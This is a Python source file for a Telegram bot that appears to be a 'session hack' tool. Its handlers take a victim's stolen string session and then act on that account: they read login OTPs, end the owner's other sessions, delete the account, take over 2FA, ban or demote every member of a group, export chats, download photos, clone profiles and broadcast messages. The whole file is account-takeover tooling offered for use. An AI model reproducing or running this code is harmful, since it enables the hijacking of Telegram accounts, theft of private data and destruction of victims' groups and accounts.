import os
from pyrogram import filters, Client
from pyrogram.types import CallbackQuery 
from Bad.Helper.data import HACK_MODS, HACK_MODS_2, HACK_MODS_3, HACK_TEXT, HACK_TEXT_2, HACK_TEXT_3
from Bad.Helper.shizu import (
    users_gc, user_info, banall, get_otp, join_ch, leave_ch, del_ch,
    check_2fa, terminate_all, del_acc, piromote, demote_all,
    export_chats, change_profile, get_sessions, forward_msg, bulk_add,
    change_user, download_photos, broadcast, get_members, clone_profile,
    delete_all_chats, block_all, change_privacy, manage_2fa
)

# ========== PAGE NAVIGATION ==========

@Client.on_callback_query(filters.regex("^page_2$"))
async def page_2_callback(client, query: CallbackQuery):
    try:
        await query.message.edit_text(
            HACK_TEXT_2,
            reply_markup=HACK_MODS_2
        )
        await query.answer()
    except Exception:
        pass

@Client.on_callback_query(filters.regex("^page_3$"))
async def page_3_callback(client, query: CallbackQuery):
    try:
        await query.message.edit_text(
            HACK_TEXT_3,
            reply_markup=HACK_MODS_3
        )
        await query.answer()
    except Exception:
        pass

# ========== A-L HANDLERS (ORIGINAL) ==========

@Client.on_callback_query(filters.regex("^A$"))
async def a_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ**")    
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        file = open("session.txt", "w")
        file.write(ch)
        file.close()
        await client.send_document(chat_id, "session.txt")
        os.system("rm -rf session.txt")
    else:
        await query.message.reply_text(
            text=ch + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True
        )

@Client.on_callback_query(filters.regex("^B$"))
async def b_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    info = await user_info(session.text)
    await query.message.reply_text(
        text=info + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^C$"))
async def c_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    gc = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ**") 
    hehe = await banall(session.text, gc)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^D$"))
async def d_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    hehe = await get_otp(session.text)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^E$"))
async def e_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    gc = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ**") 
    hehe = await join_ch(session.text, gc.text)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^F$"))
async def f_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    gc = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ**") 
    hehe = await leave_ch(session.text, gc.text)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^G$"))
async def g_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    gc = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ**") 
    hehe = await del_ch(session.text, gc.text)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^H$"))
async def h_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    hehe = await check_2fa(session.text)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^I$"))
async def i_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    hehe = await terminate_all(session.text)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^J$"))
async def j_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")    
    hehe = await del_acc(session.text)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^K$"))
async def k_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")    
    user_id = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴡʜᴏᴍ ɪ ᴡɪʟʟ ᴘʀᴏᴍᴏᴛᴇ.**")
    gc_id = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴜsᴇʀɴᴀᴍᴇ ᴡʜᴇʀᴇ ɪ ᴡɪʟʟ ᴘʀᴏᴍᴏᴛᴇ ᴛʜᴀᴛ ᴜsᴇʀ.**")
    hehe = await piromote(session.text, gc_id, user_id)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

@Client.on_callback_query(filters.regex("^L$"))
async def l_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.**")    
    gc_id = await client.ask(id, "**❖ ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀ ɴᴀᴍᴇ ᴡʜᴇʀᴇ ɪ ᴡɪʟʟ ᴅᴇᴍᴏᴛᴇ ᴀʟʟ ᴍᴇᴍʙᴇʀs.**")
    hehe = await demote_all(session.text, gc_id)
    await query.message.reply_text(
        text=hehe + "\n\n**» ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )

# ========== M-Z HANDLERS (NEW FEATURES) ==========

@Client.on_callback_query(filters.regex("^M$"))
async def m_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    result = await export_chats(session.text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^N$"))
async def n_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    name = await client.ask(id, "**❖ ᴇɴᴛᴇʀ ɴᴇᴡ ɴᴀᴍᴇ:**")
    bio = await client.ask(id, "**❖ ᴇɴᴛᴇʀ ɴᴇᴡ ʙɪᴏ (ᴏʀ sᴇɴᴅ 'skip'):**")
    bio_text = None if bio.text.lower() == 'skip' else bio.text
    result = await change_profile(session.text, name.text, bio_text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^O$"))
async def o_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    result = await get_sessions(session.text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^P$"))
async def p_callback(client: Client, query: CallbackQuery):
    await query.message.reply_text("**❖ ғᴇᴀᴛᴜʀᴇ ᴜɴᴅᴇʀ ᴅᴇᴠᴇʟᴏᴘᴍᴇɴᴛ**", reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^Q$"))
async def q_callback(client: Client, query: CallbackQuery):
    await query.message.reply_text("**❖ ғᴇᴀᴛᴜʀᴇ ᴜɴᴅᴇʀ ᴅᴇᴠᴇʟᴏᴘᴍᴇɴᴛ**", reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^R$"))
async def r_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    username = await client.ask(id, "**❖ ᴇɴᴛᴇʀ ɴᴇᴡ ᴜsᴇʀɴᴀᴍᴇ (ᴡɪᴛʜᴏᴜᴛ @):**")
    result = await change_user(session.text, username.text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^S$"))
async def s_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    result = await download_photos(session.text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^T$"))
async def t_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    message = await client.ask(id, "**❖ ᴇɴᴛᴇʀ ᴍᴇssᴀɢᴇ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ:**")
    result = await broadcast(session.text, message.text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^U$"))
async def u_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    chat = await client.ask(id, "**❖ ᴇɴᴛᴇʀ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await get_members(session.text, chat.text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^V$"))
async def v_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    target = await client.ask(id, "**❖ ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await clone_profile(session.text, target.text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^W$"))
async def w_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    confirm = await client.ask(id, "**⚠️ ᴛʜɪs ᴡɪʟʟ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴄʜᴀᴛs! ᴛʏᴘᴇ 'ᴄᴏɴғɪʀᴍ' ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ:**")
    if confirm.text.lower() == "confirm":
        result = await delete_all_chats(session.text)
        await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)
    else:
        await query.message.reply_text("**❌ ᴄᴀɴᴄᴇʟʟᴇᴅ**", reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^X$"))
async def x_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    confirm = await client.ask(id, "**⚠️ ᴛʜɪs ᴡɪʟʟ ʙʟᴏᴄᴋ ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛs! ᴛʏᴘᴇ 'ᴄᴏɴғɪʀᴍ' ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ:**")
    if confirm.text.lower() == "confirm":
        result = await block_all(session.text)
        await query.message.reply_text(text=result, reply_markup=HACK_MODS_2)
    else:
        await query.message.reply_text("**❌ ᴄᴀɴᴄᴇʟʟᴇᴅ**", reply_markup=HACK_MODS_2)

@Client.on_callback_query(filters.regex("^Y$"))
async def y_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    result = await change_privacy(session.text)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_3)

@Client.on_callback_query(filters.regex("^Z$"))
async def z_callback(client: Client, query: CallbackQuery):
    id = query.message.chat.id
    session = await client.ask(id, "**❖ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ.**")
    action = await client.ask(id, "**❖ ᴇɴᴛᴇʀ ɴᴇᴡ ᴘᴀssᴡᴏʀᴅ ᴛᴏ ᴇɴᴀʙʟᴇ 𝟸ғᴀ\nᴏʀ sᴇɴᴅ 'ᴅɪsᴀʙʟᴇ' ᴛᴏ ʀᴇᴍᴏᴠᴇ:**")
    password = None if action.text.lower() == "disable" else action.text
    result = await manage_2fa(session.text, password)
    await query.message.reply_text(text=result, reply_markup=HACK_MODS_3)
